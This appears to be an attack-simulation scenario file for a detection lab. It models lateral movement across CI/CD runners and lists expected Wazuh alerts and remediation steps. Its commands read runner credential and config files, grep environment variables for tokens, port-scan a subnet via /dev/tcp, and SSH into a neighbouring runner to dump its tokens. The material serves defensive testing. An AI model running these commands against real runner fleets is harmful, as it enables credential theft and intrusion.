name: Runner-to-Runner Lateral Movement
description: Attacker pivots from a compromised CI/CD runner to other runners in the fleet by exploiting shared secrets, network adjacency, and runner registration tokens
real_world_relevance: CircleCI January 2023 breach involving compromised runner fleet, GitHub Actions self-hosted runner attacks, Jenkins agent lateral movement via shared credentials

attack_flow.description: Attacker uses credentials and network access from one compromised runner to access other runners and their secrets
diagram: 1. Attacker compromises a single CI/CD runner
2. Discovers shared secrets (runner registration token, SSH keys)
3. Enumerates network for other runner instances
4. Uses shared credentials to access adjacent runners
5. Harvests unique secrets from each compromised runner
6. Establishes persistent access across the runner fleet

phases.name: Runner Environment Enumeration
phases.description: Map the runner fleet and discover shared resources

actions.command: cat /runner/.runner 2>/dev/null || cat /runner/config.toml 2>/dev/null || echo 'No runner config found'

phases.name: Network Reconnaissance
phases.description: Discover other runners on the network

actions.command: for ip in $(seq 1 20); do (echo >/dev/tcp/172.41.0.$ip/8080 2>/dev/null && echo "Runner found at 172.41.0.$ip") & done; wait 2>/dev/null || echo 'Network scan complete'
actions.description: Scan for other runner instances on the network

actions.command: curl -s http://mock-cicd:8080/api/v1/runners 2>/dev/null || echo 'Cannot enumerate runners via API'
actions.description: Query CI/CD API for registered runners

phases.name: Lateral Movement via Shared Secrets
phases.description: Use discovered credentials to access other runners

actions.command: cat /runner/.credentials 2>/dev/null; cat /runner/_work/_temp/.runner_token 2>/dev/null; env | grep -i RUNNER_TOKEN 2>/dev/null || echo 'No shared runner tokens found'
actions.description: Extract runner registration tokens for fleet access

actions.command: ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 runner@172.41.0.15 'env | grep TOKEN' 2>&1 || echo 'SSH lateral movement attempted'
actions.description: Attempt SSH lateral movement to adjacent runner

phases.name: Secret Harvesting Across Runners
phases.description: Collect unique secrets from each compromised runner

indicators_of_compromise.description: Shared secret accessed by unexpected runner

expected_wazuh_alerts.description: NHI: Shared secret accessed by unexpected runner

immediate: Isolate compromised runners from the network
Rotate all runner registration tokens and shared secrets
Audit all pipeline runs executed during the compromise window
long_term: Use ephemeral runners that are destroyed after each job
Use unique, scoped secrets per runner (no shared credentials)
Enable runner audit logging and anomaly detection
Implement just-in-time runner registration (GitHub: JIT runners)
